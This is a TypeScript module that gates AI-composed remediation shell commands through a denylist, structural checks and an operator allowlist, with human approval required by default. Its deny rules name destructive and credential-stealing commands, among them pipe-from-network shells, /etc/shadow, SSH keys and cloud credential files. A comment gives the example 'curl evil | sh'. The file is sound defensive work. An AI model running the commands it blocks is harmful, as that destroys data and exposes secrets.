import {
  AiRemediationCommandPolicyVerdict,
  MAX_COMMAND_LENGTH_CHARS,
} from "../../Types/AutoRemediation/AiRemediationCommandPlan";

/*
 * Policy gate for AI-composed remediation commands.
 *
 * Pure functions with no server dependencies on purpose: the same checks run
 * in three places — the AI tool that composes the command, the server-side
 * enqueue chokepoint, and the Runner agent right before execution — and the
 * last of those runs inside the customer-side Runner binary.
 *
 * Layers (weakest to strongest):
 *  1. Hard denylist — catastrophic/irreversible commands and
 *     pipe-from-network execution are refused everywhere, even with human
 *     approval. This is a BACKSTOP against obvious disasters, not a sandbox:
 *     bash obfuscation is unbounded and nothing here claims otherwise.
 *  2. Structural guard (auto-execution only) — a command may only
 *     auto-execute if it is a single simple command: no chaining, no
 *     substitution, no redirection, no pipes. This is what makes glob
 *     allowlists safe: "systemctl restart *" cannot match
 *     "systemctl restart nginx && curl evil | sh" because the chain
 *     characters already disqualified it.
 *  3. Operator allowlist (auto-execution only) — the command must match a
 *     pattern a human wrote on the rule. No allowlist, no auto-execution.
 *
 * Anything not denied and not auto-approved requires human approval — that
 * is the default posture.
 */

export interface CommandPolicyResult {
  verdict: AiRemediationCommandPolicyVerdict;
  reason: string;
}

interface DenyRule {
  pattern: RegExp;
  reason: string;
}

/*
 * Matched against a normalized copy of the command (quotes stripped,
 * whitespace collapsed, lowercased) so trivial quoting does not evade them.
 */
const DENY_RULES: Array<DenyRule> = [
  {
    pattern:
      /\brm\s+(-[a-z]*\s+)*-[a-z]*[rf][a-z]*\b|\brm\s+(-[a-z]*\s+)*--force\b|\brm\s+(-[a-z]*\s+)*--recursive\b/,
    reason: "recursive or forced file deletion",
  },
  {
    pattern: /\bmkfs\b|\bwipefs\b|\bshred\b|\bblkdiscard\b/,
    reason: "filesystem/device destruction",
  },
  {
    pattern: /\bdd\b[^\n]*\bof=\/dev\//,
    reason: "writing directly to a block device",
  },
  {
    pattern: /\b(fdisk|parted|sgdisk|cfdisk)\b/,
    reason: "disk partitioning",
  },
  {
    pattern: />\s*\/dev\/(sd|nvme|vd|xvd|hd)/,
    reason: "redirecting output onto a block device",
  },
  {
    pattern:
      /\b(shutdown|reboot|halt|poweroff)\b|\binit\s+[06]\b|\bsystemctl\s+(poweroff|reboot|halt|kexec|suspend|hibernate)\b/,
    reason: "host shutdown or reboot",
  },
  {
    pattern: /:\s*\(\s*\)\s*\{/,
    reason: "fork bomb",
  },
  {
    pattern: /\b(curl|wget)\b[^\n]*\|\s*(ba|z|da|k)?sh\b/,
    reason: "piping a network download into a shell",
  },
  {
    pattern: /\b(ba|z|da|k)?sh\s+-c\s+[^\n]*\$\(\s*(curl|wget)\b/,
    reason: "executing a network download",
  },
  {
    pattern: /\/etc\/shadow\b|\/etc\/sudoers\b/,
    reason: "touching the system credential store",
  },
  {
    pattern: /\.ssh\/(id_[a-z0-9]+|authorized_keys)\b/,
    reason: "touching SSH keys",
  },
  {
    pattern: /\.aws\/credentials\b|\.kube\/config\b/,
    reason: "touching cloud credential files",
  },
  {
    pattern: /\buserdel\b|\bgroupdel\b|\bdeluser\b/,
    reason: "deleting system users",
  },
  {
    pattern:
      /\bchmod\s+(-[a-z]+\s+)*777\s+\/(\s|$)|\bchmod\s+(-[a-z]+\s+)*-r\b[^\n]*\s\/(\s|$)/,
    reason: "recursive or world-writable permission change on /",
  },
  {
    pattern: /\bchown\b[^\n]*\s-r\b[^\n]*\s\/(\s|$)/,
    reason: "recursive ownership change on /",
  },
  {
    pattern: /\bkill\s+(-9\s+|-kill\s+)?1(\s|$)|\bkillall5\b/,
    reason: "killing PID 1",
  },
  {
    pattern:
      /\biptables\s+(-[a-z]+\s+)*-f(\s|$)|\bnft\s+flush\s+ruleset\b|\bufw\s+disable\b/,
    reason: "flushing or disabling the firewall",
  },
  {
    pattern: /\bcrontab\s+(-[a-z]+\s+)*-r\b/,
    reason: "removing all cron jobs",
  },
  {
    pattern: /\bdrop\s+(database|table|schema)\b|\btruncate\s+table\b/,
    reason: "destructive database statement",
  },
  {
    pattern:
      /\bkubectl\s+delete\s+(ns|namespace|pv|persistentvolume|pvc|persistentvolumeclaim|crd|customresourcedefinition)s?\b/,
    reason: "deleting cluster-level Kubernetes resources",
  },
  {
    pattern: /\bhistory\s+-c\b|\bunset\s+histfile\b/,
    reason: "shell history tampering",
  },
];

/*
 * Characters/sequences that disqualify a command from AUTO-execution.
 * Checked character-wise on the raw string, so quoting cannot hide them —
 * "restart 'a; b'" is still not a simple command as far as auto mode is
 * concerned. Humans can still approve such commands.
 */
interface StructuralRule {
  test: (command: string) => boolean;
  reason: string;
}

const AUTO_EXECUTION_STRUCTURAL_RULES: Array<StructuralRule> = [
  {
    test: (c: string) => {
      return c.includes("\n") || c.includes("\r");
    },
    reason: "multi-line commands cannot auto-execute",
  },
  {
    test: (c: string) => {
      return c.includes(";");
    },
    reason: 'command chaining with ";" cannot auto-execute',
  },
  {
    test: (c: string) => {
      return c.includes("&");
    },
    reason: 'command chaining or backgrounding with "&" cannot auto-execute',
  },
  {
    test: (c: string) => {
      return c.includes("|");
    },
    reason: "pipes cannot auto-execute",
  },
  {
    test: (c: string) => {
      return c.includes("`") || c.includes("$(");
    },
    reason: "command substitution cannot auto-execute",
  },
  {
    test: (c: string) => {
      return c.includes(">") || c.includes("<");
    },
    reason: "redirection cannot auto-execute",
  },
];

const MAX_ALLOWLIST_PATTERNS: number = 100;
const MAX_ALLOWLIST_PATTERN_LENGTH: number = 500;

export default class CommandPolicy {
  /*
   * The full evaluation used everywhere. allowlistPatterns are the
   * operator-authored globs from the AutoRemediationRule; pass an empty
   * array when evaluating for the approval path (nothing auto-approves).
   */
  public static evaluateCommand(data: {
    command: string;
    allowlistPatterns: Array<string>;
  }): CommandPolicyResult {
    const command: string = data.command || "";

    if (!command.trim()) {
      return {
        verdict: AiRemediationCommandPolicyVerdict.Denied,
        reason: "Empty command.",
      };
    }

    if (command.length > MAX_COMMAND_LENGTH_CHARS) {
      return {
        verdict: AiRemediationCommandPolicyVerdict.Denied,
        reason: `Command exceeds the ${MAX_COMMAND_LENGTH_CHARS}-character limit.`,
      };
    }

    const denyReason: string | null = CommandPolicy.getDenyReason(command);
    if (denyReason) {
      return {
        verdict: AiRemediationCommandPolicyVerdict.Denied,
        reason: `Denied by the remediation command policy: ${denyReason}. This command cannot run even with human approval.`,
      };
    }

    const structuralReason: string | null =
      CommandPolicy.getAutoExecutionStructuralReason(command);
    if (structuralReason) {
      return {
        verdict: AiRemediationCommandPolicyVerdict.RequiresApproval,
        reason: `Requires human approval: ${structuralReason}.`,
      };
    }

    if (
      CommandPolicy.matchesAllowlist({
        command: command,
        allowlistPatterns: data.allowlistPatterns,
      })
    ) {
      return {
        verdict: AiRemediationCommandPolicyVerdict.AutoApproved,
        reason: "Matched the rule's command allowlist.",
      };
    }

    return {
      verdict: AiRemediationCommandPolicyVerdict.RequiresApproval,
      reason:
        "Requires human approval: the command does not match the rule's command allowlist.",
    };
  }

  // Null when clean, otherwise the human-readable reason it is denied.
  public static getDenyReason(command: string): string | null {
    const normalized: string = CommandPolicy.normalizeForInspection(command);
    for (const rule of DENY_RULES) {
      /*
       * Fresh evaluation each call — DENY_RULES patterns are not /g, but
       * be defensive about lastIndex anyway.
       */
      rule.pattern.lastIndex = 0;
      if (rule.pattern.test(normalized)) {
        return rule.reason;
      }
    }
    return null;
  }

  // Null when the command is a single simple command eligible for auto mode.
  public static getAutoExecutionStructuralReason(
    command: string,
  ): string | null {
    for (const rule of AUTO_EXECUTION_STRUCTURAL_RULES) {
      if (rule.test(command)) {
        return rule.reason;
      }
    }
    return null;
  }

  /*
   * Glob match: "*" matches any run of characters (newlines never reach
   * here — the structural guard runs first on the auto path). Whitespace
   * runs are collapsed on both sides so formatting differences do not
   * defeat a pattern. Full-string match, case-sensitive.
   */
  public static matchesAllowlist(data: {
    command: string;
    allowlistPatterns: Array<string>;
  }): boolean {
    const patterns: Array<string> = (data.allowlistPatterns || [])
      .filter((p: unknown) => {
        return typeof p === "string" && p.trim().length > 0;
      })
      .slice(0, MAX_ALLOWLIST_PATTERNS);

    if (patterns.length === 0) {
      return false;
    }

    const command: string = CommandPolicy.collapseWhitespace(data.command);

    for (const pattern of patterns) {
      if (pattern.length > MAX_ALLOWLIST_PATTERN_LENGTH) {
        continue;
      }
      const normalizedPattern: string =
        CommandPolicy.collapseWhitespace(pattern);
      if (CommandPolicy.globMatches(normalizedPattern, command)) {
        return true;
      }
    }

    return false;
  }

  /*
   * Linear-time glob match, deliberately NOT a compiled regex.
   *
   * A pattern is operator-authored but only project-admin-authored, and
   * translating "*" runs into a regex ("a[\s\S]*b[\s\S]*c…") makes a pattern
   * like "*ab*ab*ab*ab*z" backtrack catastrophically against a non-matching
   * command — a saved rule would then be able to hang the Node event loop
   * for every tenant on the pod. This two-pointer scan with backtracking on
   * the LAST wildcard only is O(pattern x command) worst case and cannot
   * blow up.
   */
  public static globMatches(pattern: string, text: string): boolean {
    let patternIndex: number = 0;
    let textIndex: number = 0;
    let lastWildcardIndex: number = -1;
    let matchAfterWildcard: number = 0;

    while (textIndex < text.length) {
      /*
       * The wildcard branch MUST be tested before literal equality: a
       * command may legitimately contain a literal "*" (for example
       * "chmod 644 /var/www/*"), and consuming the pattern's "*" as a
       * literal there would strand the rest of the text with no wildcard to
       * absorb it. Treating "*" as a wildcard is never less permissive — it
       * can still match a single literal "*" via the backtrack below.
       */
      if (patternIndex < pattern.length && pattern[patternIndex] === "*") {
        lastWildcardIndex = patternIndex;
        matchAfterWildcard = textIndex;
        patternIndex++;
        continue;
      }

      if (
        patternIndex < pattern.length &&
        pattern[patternIndex] === text[textIndex]
      ) {
        patternIndex++;
        textIndex++;
        continue;
      }

      if (lastWildcardIndex >= 0) {
        // Give the last wildcard one more character and retry from there.
        patternIndex = lastWildcardIndex + 1;
        matchAfterWildcard++;
        textIndex = matchAfterWildcard;
        continue;
      }

      return false;
    }

    // Trailing wildcards may absorb the empty remainder.
    while (patternIndex < pattern.length && pattern[patternIndex] === "*") {
      patternIndex++;
    }

    return patternIndex === pattern.length;
  }

  private static collapseWhitespace(text: string): string {
    return (text || "").trim().replace(/\s+/g, " ");
  }

  /*
   * Strip the quoting bash itself would strip before matching, so the
   * cheapest evasions (rm -r"f", r\m -rf) do not walk past the denylist.
   * Backslashes go too: bash reads `\m` as `m`, and no deny rule matches on
   * a backslash, so removing them can only make matching stricter.
   *
   * This is not a shell parser and does not pretend to be one — see the
   * header: the denylist is a backstop, and the layers that actually bound
   * what may run unattended are the structural guard and the operator
   * allowlist.
   */
  private static normalizeForInspection(command: string): string {
    return CommandPolicy.collapseWhitespace(command)
      .replace(/["'\\]/g, "")
      .toLowerCase();
  }
}
